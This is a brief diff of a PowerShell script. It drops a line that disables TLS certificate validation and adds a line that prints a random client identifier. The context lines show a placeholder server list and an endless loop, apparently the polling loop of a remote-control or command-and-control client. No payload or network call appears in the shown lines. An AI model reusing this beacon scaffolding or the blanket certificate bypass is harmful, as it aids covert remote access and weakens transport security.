@@ -1,6 +1,6 @@
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $servers = @("x.x.x.x:x")
 $iden = -join ((65..90) + (97..122) | Get-Random -Count 4 | % {[char]$_})
+Write-Host $iden
 $output = ""
 while ($true) {
     try {
